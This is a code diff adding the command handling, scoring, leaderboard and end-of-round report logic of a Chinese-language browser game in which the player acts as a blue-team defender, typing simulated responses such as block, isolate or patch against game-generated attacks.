+      printRaw(`时间 ${fmtClock(st.t)}/${fmtClock(st.total)} · 业务 ${st.biz}/100 · 数据 ${st.data}/100 · 我的得分 ${st.me} · 协防 ${st.assists} · 失守 ${st.missed}`);
+      activeOnMe().length && printRaw(`⚠ 你的主机有 ${activeOnMe().length} 起未解决攻击！`, 't-r');
+      activeOnMates().forEach(x => printRaw(`  [A${String(x.id).padStart(2, '0')}] ${x.target.mate.name} ← ${x.atk.n}（${esc(x.redName)}）`, 't-w'));
+      return;
+    }
+    if (verb === 'assist') {
+      var pend = activeOnMates().filter(x => !x.assist);
+      if (!pend.length) { printRaw('assist: 当前没有可接管的队友攻击事件。', 't-w'); return; }
+      if (st.console && st.console.state === 'active') { printRaw('assist: 你的终端已有进行中的防御，先解决它。', 't-w'); return; }
+      var x = arg ? pend.find(y => String(y.id) === arg.replace(/^a/i, '')) || pend.find(y => norm(arg) === norm(y.target.mate.name)) : pend[0];
+      if (!x) { printRaw('assist: 编号无效。可用：' + pend.map(y => 'A' + y.id).join('、'), 't-r'); return; }
+      x.assist = true; x.target = 'you'; x.deadline = Math.max(x.deadline, st.t + 240);
+      pushConsole(x);
+      printRaw(`🤝 已接管 [A${String(x.id).padStart(2, '0')}] ${x.atk.n} —— 防御窗口剩余 ${x.deadline - st.t}s。`, 't-i');
+      return;
+    }
+    if (!['block', 'isolate', 'kill', 'rm', 'disable', 'passwd', 'patch', 'hunt', 'restore', 'ignore'].includes(verb)) {
+      printRaw(`bash: ${verb}: 未知的防御命令（输 help 查看手册）`, 't-r'); return;
+    }
+    if (!st.console || st.console.state !== 'active') { printRaw('当前没有待处置目标，等待下一波……', 't-w'); return; }
+
+    var x = st.console;
+    if (x.benign) {
+      if (verb === 'ignore') return resolveBenign(x);
+      return resolveMisop(x, `❌ 误伤业务！这其实是【${x.benign.n}】——${x.benign.teach}`);
+    }
+    var a = x.atk, need = x.need;
+
+    if (verb === 'ignore') {
+      var ign = need.findIndex(y => y[0] === 'ignore');
+      if (ign > -1) { need.splice(ign, 1); return resolveSuccess(x, false); }
+      return failAttack(x, '你选择忽略——攻击得逞了');
+    }
+
+    var idx = need.findIndex(y => y[0] === verb && (y[1] === '' ? !arg : argMatch(arg, y[1])));
+    if (idx === -1) { printRaw('命令已执行，但目标与当前威胁不符（无害操作，浪费了时间）。仔细看遥测里的 IP/主机/文件名。', 't-w'); return; }
+    need.splice(idx, 1);
+    if (need.length) { printRaw(`✓ 动作生效（还差 ${need.length} 步：${need.map(y => y[0] + ' ' + y[1]).join(' / ')}）`, 't-g'); return; }
+    resolveSuccess(x, x.assist);
+  }
+
+  function resolveBenign(x) {
+    x.state = 'resolved';
+    st.me += 8;
+    feed('✅ 蓝队·你 正确放行正常业务 +8');
+    printRaw('✅ 判定正确：正常业务放行（+8）。' + x.benign.teach, 't-g');
+    nextConsole();
+  }
+  function resolveMisop(x, msg) {
+    x.state = 'resolved';
+    st.me = Math.max(0, st.me - 8); st.misop++;
+    st.biz = Math.max(0, st.biz - 10);
+    feed('⚠️ 蓝队·你 误伤正常业务 -8（业务可用性 -10）');
+    printRaw(msg, 't-r');
+    printRaw('⚠️ 误处置正常业务：业务可用性 -10，你的得分 -8。', 't-r');
+    nextConsole();
+  }
+
+  function showHelp() {
+    [['block <IP/域名>', '防火墙封禁来源'], ['isolate <主机>', '断网隔离主机'], ['kill <进程>', '终止恶意进程'],
+     ['rm <文件/任务/公钥/服务>', '删除恶意落地物'], ['disable <账号>', '禁用可疑账号'], ['passwd <账号>', '重置凭据'],
+     ['patch <组件>', '修复/升级组件'], ['hunt', '主动狩猎：全网回溯 IOC'], ['restore <备份>', '从备份恢复'],
+     ['assist [A编号]', '接管队友被攻击事件协防'], ['ignore', '正常业务放行'], ['status', '当前态势']]
+      .forEach(r0 => print(`  <span class="t-p">${esc(r0[0])}</span><span style="color:var(--tx3)"> — ${esc(r0[1])}</span>`));
+  }
+
+  /* ---------- 侧栏 / 面板 ---------- */
+  function updateTop() {
+    $('#ctClock').textContent = fmtClock(st.t);
+    $('#ctRemain').textContent = fmtClock(Math.max(0, st.total - st.t));
+    meters();
+  }
+  function meters() {
+    $('#ctBiz').textContent = Math.max(0, st.biz);
+    $('#ctData').textContent = Math.max(0, st.data);
+    $('#ctMy').textContent = st.me;
+    $('#ctRed').textContent = st.red.reduce((s, x) => s + x.score, 0);
+    $('#ctActive').textContent = activeCount();
+    $('#ctStopped').textContent = st.stopped;
+  }
+  function board() {
+    const rows = [{ name: '蓝队·你（你）', score: st.me, me: true },
+      ...st.mates.map(b => ({ name: '蓝队·' + b.name, score: b.score })),
+      ...st.red.map(x => ({ name: x.name + '〔' + ACC[x.access] + '〕', score: x.score, red: true }))];
+    rows.sort((a, b) => b.score - a.score);
+    $('#ctBoard').innerHTML = rows.map((x, i) => `
+      <div class="lb-row ${x.me ? 'me' : ''} ${x.red ? 'red' : ''}">
+        <span class="lb-rank">${i + 1}</span>
+        <span class="lb-name">${esc(x.name)}</span>
+        <span class="lb-score">${x.score}</span>
+      </div>`).join('');
+  }
+
+  /* ---------- 结算与排位 ---------- */
+  function end(beat) {
+    clearInterval(timer);
+    $('#ctfConsole').style.display = 'none';
+    var rep = $('#ctfReport');
+    rep.style.display = 'block';
+    var blueSum = st.me + st.mates.reduce(function (s, b) { return s + b.score; }, 0);
+    var redSum = st.red.reduce(function (s, x) { return s + x.score; }, 0);
+    var win = blueSum >= redSum && st.biz > 0;
+    var rating = parseInt(localStorage.getItem('ctf_rating') || '1000', 10);
+    var delta = Math.max(-30, Math.min(40, (win ? 20 : -15) + st.me / 5 - st.missed * 2 - st.misop * 2));
+    var newRating = Math.max(800, Math.round(rating + delta));
+    localStorage.setItem('ctf_rating', String(newRating));
+    if (win) localStorage.setItem('ctf_w', (+localStorage.getItem('ctf_w') || 0) + 1);
+    else localStorage.setItem('ctf_l', (+localStorage.getItem('ctf_l') || 0) + 1);
+
+    var rows = [{ name: '蓝队·你（你）', score: st.me, me: true }]
+      .concat(st.mates.map(function (b) { return { name: '蓝队·' + b.name, score: b.score }; }))
+      .concat(st.red.map(function (x) { return { name: x.name + '〔' + ACC[x.access] + '〕', score: x.score, red: true }; }))
+      .sort(function (a, b) { return b.score - a.score; });
+    var myRank = 1; rows.forEach(function (x, i) { if (x.me) myRank = i + 1; });
+
+    Progress.recordGame('ctf', win ? 'W' : 'L');
+    Progress.addXP(Math.round(st.me / 3) + (win ? 30 : 10), 'CTF 攻防排位');
+    if (window.App) App.confetti(win ? 90 : 40);
+
+    var rep = $('#ctfReport');
+    var html = '<div class="card game-over">' +
+      '<div class="go-ico">' + (win ? '🏆' : '🛡️') + '</div>' +
+      '<h3>' + (win ? '蓝队胜利！' : '红队占据上风') + '</h3>' +
+      '<p>蓝队总分 <b style="color:var(--cy)">' + blueSum + '</b> vs 红队总分 <b style="color:var(--ro)">' + redSum + '</b> · 你的排名 <b style="color:var(--am)">第 ' + myRank + ' 名 / 20</b></p>' +
+      '<div class="report-grid">' +
+      '<div class="rg"><b>' + st.me + '</b><span>我的得分</span></div>' +
+      '<div class="rg"><b>' + st.stopped + '</b><span>成功防御</span></div>' +
+      '<div class="rg"><b>' + st.missed + '</b><span>失守次数</span></div>' +
+      '<div class="rg"><b>' + st.assists + '</b><span>协防次数</span></div>' +
+      '</div>' +
+      '<div style="display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin:10px 0 16px">' +
+      '<span class="tag am">排位分 ' + rating + ' → <b>' + newRating + '</b>（' + (delta >= 0 ? '+' : '') + delta + '）</span>' +
+      '<span class="tag vi">段位：' + segName(newRating) + '</span>' +
+      '<span class="tag">战绩 ' + localStorage.getItem('ctf_w') + ' 胜 ' + localStorage.getItem('ctf_l') + ' 负</span>' +
+      '</div>' +
+      '<div class="card" style="text-align:left;padding:14px 18px;margin:14px 0">' +
+      '<h4 style="font-size:14px;font-weight:800;margin-bottom:10px">🏆 最终排名（20 名按积分）</h4>';
+    rows.sort(function (a, b) { return b.score - a.score; }).forEach(function (x, i) {
+      html += '<div style="display:flex;gap:10px;padding:5px 8px;border-radius:8px;' + (x.me ? 'background:rgba(34,211,238,.1)' : '') + ';' + (x.red ? 'color:var(--ro)' : '') + '">' +
+        '<span style="font-family:var(--m);width:34px">' + (i + 1) + '</span>' +
+        '<span style="flex:1;font-size:13.5px">' + esc(x.name) + (x.me ? ' ←你' : '') + '</span>' +
+        '<b style="font-family:var(--m);font-size:13.5px">' + x.score + '</b></div>';
+    });
+    html += '</div>';
+    if (st.log.length) {
+      html += '<div style="text-align:left;margin:14px 0"><h4 style="font-size:14px;font-weight:800;margin-bottom:10px">📝 你的失守回合复盘</h4>';
+      st.log.forEach(function (m0) {
+        html += '<div class="card" style="padding:12px 16px;margin-bottom:9px;text-align:left"><b style="font-size:13.5px">' + esc(m0.n) + '</b>' +
+          '<div style="font-size:12.5px;color:var(--tx2);line-height:1.8">正确处置：' + esc(m0.need) + '<br>💡 ' + esc(m0.teach) + '</div></div>';
+      });
+      html += '</div>';
+    } else {
+      html += '<p style="color:var(--gr);font-weight:700;margin:14px 0">全程零失守——铜墙铁壁！</p>';
+    }
+    html += '<div style="display:flex;gap:12px;justify-content:center;margin-top:16px">' +
+      '<button class="btn btn-primary" onclick="location.reload()">⚔️ 再打一局（全新随机）</button>' +
+      '<a class="btn btn-ghost" href="games.html">返回游戏中心</a></div></div>';
+    rep.innerHTML = html;
+    if (window.App) App.toast('排位 ' + (delta >= 0 ? '+' : '') + delta + ' · ' + segName(newRating), '⚔️', true);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  /* ---------- 输入 ---------- */
+  function buildInput() {
+    inputLine = box.querySelector('.ln-in');
+    input = box.querySelector('.term-input');
+    input.addEventListener('keydown', e => { if (e.key === 'Enter') { const v = input.value; input.value = ''; run(v); } });
+    $('#ctSend').addEventListener('click', () => { const v = input.value; input.value = ''; run(v); });
+    box.addEventListener('click', () => { if (input && !(st && st.console && st.console.state === 'resolved')) input.focus({ preventScroll: true }); });
+  }
+
+  /* ---------- 启动 ---------- */
+  document.addEventListener('DOMContentLoaded', () => {
+    box = document.getElementById('ctTerm');
+    if (!box) return;
+    buildInput();
+    inputLine.style.visibility = 'hidden';
+    if (location.hash.includes('demo')) window.__ctfEnd = function () { end(false); };
+    var rating = parseInt(localStorage.getItem('ctf_rating') || '1000', 10);
+    $('#segTag').textContent = '段位：' + segName(rating);
+    $('#ratingNow').textContent = rating;
+    $('#recTag').textContent = '战绩 ' + (localStorage.getItem('ctf_w') || 0) + ' 胜 ' + (localStorage.getItem('ctf_l') || 0) + ' 负';
+    $('#startBtn').onclick = function () {
+      inputLine.style.visibility = 'visible';
+      start();
+    };
+  });
+})();
